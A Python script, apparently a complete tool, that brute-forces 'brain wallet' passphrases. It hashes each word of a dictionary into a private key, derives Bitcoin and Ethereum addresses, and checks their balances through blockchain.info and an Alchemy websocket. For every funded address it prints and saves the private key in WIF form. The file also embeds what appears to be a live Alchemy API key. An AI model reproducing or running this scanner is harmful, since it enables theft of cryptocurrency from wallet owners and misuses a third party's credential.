#!/usr/bin/env python3
from __future__ import annotations
import argparse, io, sys, time, logging, hashlib, binascii, json
import requests, base58
from coincurve import PrivateKey
try:
    from Crypto.Hash import keccak
except Exception:
    keccak = None
try:
    from bech32 import bech32_encode, convertbits
    _HAS_BECH32 = True
except Exception:
    _HAS_BECH32 = False

def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()

def hash160(b: bytes) -> bytes:
    return hashlib.new('ripemd160', hashlib.sha256(b).digest()).digest()

def base58check(prefix: bytes, payload: bytes) -> str:
    raw = prefix + payload
    chk = sha256(sha256(raw))[:4]
    return base58.b58encode(raw + chk).decode()

def privhex_from_passphrase(word: str) -> str:
    return sha256(word.encode('utf-8')).hex()

def wif_from_privhex(priv_hex: str, compressed: bool = True) -> str:
    b = bytes.fromhex(priv_hex)
    payload = b'\x80' + b + (b'\x01' if compressed else b'')
    chk = sha256(sha256(payload))[:4]
    return base58.b58encode(payload + chk).decode()

def btc_p2pkh(pub_bytes: bytes) -> str:
    return base58check(b'\x00', hash160(pub_bytes))

def btc_p2sh_p2wpkh(pub_bytes: bytes) -> str:
    redeem_script = b'\x00\x14' + hash160(pub_bytes)
    return base58check(b'\x05', hash160(redeem_script))

def btc_bech32(pub_bytes: bytes) -> str:
    if not _HAS_BECH32:
        raise RuntimeError("bech32 library not available (pip install bech32)")
    witprog = hash160(pub_bytes)
    data = convertbits(witprog, 8, 5, True)
    if data is None:
        raise RuntimeError("bech32.convertbits failed")
    data5 = [0] + data
    addr = bech32_encode("bc", data5)
    return addr

def _keccak_256(data: bytes) -> bytes:
    if keccak is None:
        raise RuntimeError("pycryptodome required for keccak (pip install pycryptodome)")
    k = keccak.new(digest_bits=256)
    k.update(data)
    return k.digest()

def to_checksum_address(addr_hex_lower: str) -> str:
    if len(addr_hex_lower) != 40:
        raise ValueError("Invalid address length for checksum")
    addr_lower = addr_hex_lower.lower()
    h = _keccak_256(addr_lower.encode('ascii')).hex()
    out = []
    for i, c in enumerate(addr_lower):
        if c in '0123456789':
            out.append(c)
        else:
            out.append(c.upper() if int(h[i], 16) >= 8 else c)
    return ''.join(out)

def eth_address_from_privhex(priv_hex: str) -> str:
    priv_bytes = bytes.fromhex(priv_hex)
    pk = PrivateKey(priv_bytes)
    pub_uncompressed = pk.public_key.format(compressed=False)
    pub_no_prefix = pub_uncompressed[1:]
    digest = _keccak_256(pub_no_prefix)
    addr_bytes = digest[-20:]
    addr_hex = addr_bytes.hex()
    return "0x" + to_checksum_address(addr_hex)

def _get_raw_numeric(session: requests.Session, url: str, timeout: float = 15.0) -> float:
    try:
        r = session.get(url, timeout=timeout)
        r.raise_for_status()
    except Exception as e:
        logging.debug("HTTP error for %s: %s", url, e)
        return 0.0
    text = r.text.strip()
    try:
        return float(text)
    except Exception:
        pass
    try:
        j = r.json()
        for key in ("total_received","totalReceived","final_balance","finalBalance","balance","received","result"):
            if isinstance(j, dict) and key in j:
                try:
                    return float(j[key])
                except Exception:
                    try:
                        return float(str(j[key]))
                    except Exception:
                        pass
    except Exception:
        pass
    return 0.0

def print_used_btc(word, label, addr, wif, recv_val, bal_val, fout):
    print("\n=== USED BTC WALLET FOUND ===")
    print(f"WORD: {word}")
    print(f"TYPE: {label}")
    print(f"ADDRESS: {addr}")
    print(f"WIF: {wif}")
    print(f"TOTAL_RECEIVED: {recv_val}")
    print(f"BALANCE: {bal_val}")
    print("============================\n")
    fout.write(f"{word},BTC,{label},{addr},{wif},{recv_val},{bal_val}\n")
    fout.flush()

def print_used_eth(word, eth_addr, raw_wei, fout):
    try:
        eth_amount = float(raw_wei) / 1e18
    except Exception:
        eth_amount = 0.0
    print("\n=== USED ETH WALLET FOUND ===")
    print(f"WORD: {word}")
    print(f"ETH ADDRESS: {eth_addr}")
    print(f"BALANCE RAW (wei): {raw_wei}")
    print(f"BALANCE (ETH): {eth_amount}")
    print("===========================\n")
    fout.write(f"{word},ETH,,{eth_addr},,{raw_wei},{eth_amount}\n")
    fout.flush()

def _eth_rpc_ws_connect(url: str, timeout: float = 10.0):
    try:
        import websocket
    except Exception:
        return None, "websocket-client not installed"
    try:
        ws = websocket.create_connection(url, timeout=timeout)
        return ws, None
    except Exception as e:
        return None, str(e)

def _eth_get_balance_ws(ws, eth_addr: str, req_id: int = 1, timeout: float = 15.0) -> int:
    payload = {"jsonrpc": "2.0", "id": req_id, "method": "eth_getBalance", "params": [eth_addr, "latest"]}
    try:
        ws.send(json.dumps(payload))
        resp = ws.recv()
        j = json.loads(resp)
        if isinstance(j, dict) and "result" in j and j["result"]:
            try:
                return int(j["result"], 16)
            except Exception:
                return 0
        return 0
    except Exception:
        raise

def main():
    ap = argparse.ArgumentParser(description="Brute sequential scanner: BTC (1,3,bc1q) + ETH (default on).")
    ap.add_argument("--dict", "-d", default="dictionary.txt", help="wordlist (one passphrase per line)")
    ap.add_argument("--out", "-o", default="found.txt", help="append CSV output")
    ap.add_argument("--sleep", type=float, default=0.6, help="seconds to sleep AFTER each API call (default 0.6)")
    ap.add_argument("--debug", action="store_true", help="debug logging")
    ap.add_argument("--no-eth", dest="eth", action="store_false", help="disable Ethereum checks (ETH checks are ON by default)")
    ap.set_defaults(eth=True)
    ap.add_argument("--base-received", default="https://blockchain.info/q/getreceivedbyaddress")
    ap.add_argument("--base-balance", default="https://blockchain.info/q/addressbalance")
    ap.add_argument("--alchemy-ws", default="wss://eth-mainnet.g.alchemy.com/v2/k5d8RoDGOyxZmVWy2UPNowQlqFoZM3TX")
    args = ap.parse_args()

    logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

    try:
        _ = PrivateKey(b'\x01' * 32)
    except Exception as e:
        logging.error("coincurve missing or failing: %s", e)
        sys.exit(1)
    if args.eth and keccak is None:
        logging.error("ETH checks enabled but Crypto.Hash.keccak (pycryptodome) not found. Install: pip install pycryptodome")
        sys.exit(1)
    if not _HAS_BECH32:
        logging.warning("bech32 library not found; bc1q address generation will be skipped. Install: pip install bech32")

    try:
        fdict = io.open(args.dict, "rt", encoding="utf-8", errors="ignore")
    except Exception as e:
        logging.error("Cannot open dictionary: %s", e)
        sys.exit(1)
    try:
        fout = open(args.out, "a", encoding="utf-8", buffering=1)
    except Exception as e:
        logging.error("Cannot open output file: %s", e)
        sys.exit(1)

    session = requests.Session()
    ws = None
    ws_req_id = 1
    if args.eth:
        ws, ws_err = _eth_rpc_ws_connect(args.alchemy_ws)
        if ws is None:
            logging.error("Cannot open Alchemy websocket: %s", ws_err)
            logging.error("Disabling ETH checks.")
            args.eth = False
        else:
            logging.info("Connected to Alchemy WS")

    total = checked = found = 0
    start_time = time.time()
    current_word = None

    try:
        for raw in fdict:
            try:
                word = raw.strip()
                current_word = word
                if not word:
                    continue
                total += 1
                try:
                    priv_hex = privhex_from_passphrase(word)
                    pk = PrivateKey(bytes.fromhex(priv_hex))
                    pub_compressed = pk.public_key.format(compressed=True)
                    wif = wif_from_privhex(priv_hex, compressed=True)
                except Exception as e:
                    logging.debug("Derivation failed for '%s': %s", word, e)
                    continue

                btc_addresses = [
                    ("P2PKH", btc_p2pkh(pub_compressed)),
                    ("P2SH-P2WPKH", btc_p2sh_p2wpkh(pub_compressed))
                ]
                if _HAS_BECH32:
                    try:
                        btc_addresses.append(("Bech32", btc_bech32(pub_compressed)))
                    except Exception as e:
                        logging.debug("Bech32 derivation error: %s", e)

                for label, addr in btc_addresses:
                    checked += 1
                    url_recv = f"{args.base_received}/{addr}"
                    recv_val = _get_raw_numeric(session, url_recv, timeout=20.0)
                    time.sleep(args.sleep)
                    if recv_val > 0:
                        url_bal = f"{args.base_balance}/{addr}"
                        bal_val = _get_raw_numeric(session, url_bal, timeout=20.0)
                        time.sleep(args.sleep)
                        logging.info("Found used BTC address %s %s (recv=%s bal=%s)", label, addr, recv_val, bal_val)
                        print_used_btc(word, label, addr, wif, recv_val, bal_val, fout)
                        found += 1

                if args.eth:
                    try:
                        eth_addr = eth_address_from_privhex(priv_hex)
                        try:
                            eth_wei = _eth_get_balance_ws(ws, eth_addr, req_id=ws_req_id)
                            ws_req_id += 1
                        except Exception:
                            try:
                                ws.close()
                            except Exception:
                                pass
                            ws, ws_err = _eth_rpc_ws_connect(args.alchemy_ws)
                            if ws is None:
                                logging.error("Alchemy WS reconnect failed: %s", ws_err)
                                args.eth = False
                                eth_wei = 0
                            else:
                                try:
                                    eth_wei = _eth_get_balance_ws(ws, eth_addr, req_id=ws_req_id)
                                    ws_req_id += 1
                                except Exception:
                                    eth_wei = 0
                        time.sleep(args.sleep)
                        if eth_wei > 0:
                            logging.info("Found used ETH address %s (wei=%s)", eth_addr, eth_wei)
                            print_used_eth(word, eth_addr, eth_wei, fout)
                            found += 1
                    except Exception as e:
                        logging.debug("ETH check error for word '%s': %s", word, e)
                        time.sleep(args.sleep)

                if total % 1000 == 0:
                    elapsed = time.time() - start_time
                    logging.info("Processed %d words — checked:%d found:%d — avg %.2f words/s", total, checked, found, total / max(1.0, elapsed))

            except KeyboardInterrupt:
                print("\n*** INTERRUPTED by user (inner) ***")
                print(f"Stopping while processing word: {current_word!r}")
                raise

    except KeyboardInterrupt:
        print("\n*** INTERRUPTED by user (outer) ***")
        if current_word:
            print(f"Stopped while processing word: {current_word!r}")
        else:
            print("Stopped before processing any word.")
        logging.info("Interrupted by user after processing %d words, checked %d, found %d", total, checked, found)

    finally:
        try:
            if ws is not None:
                ws.close()
        except Exception:
            pass
        session.close()
        fdict.close()
        fout.close()
        elapsed = time.time() - start_time
        logging.info("Finished. Total read: %d, checked:%d found:%d, elapsed %.1fs", total, checked, found, elapsed)

if __name__ == "__main__":
    main()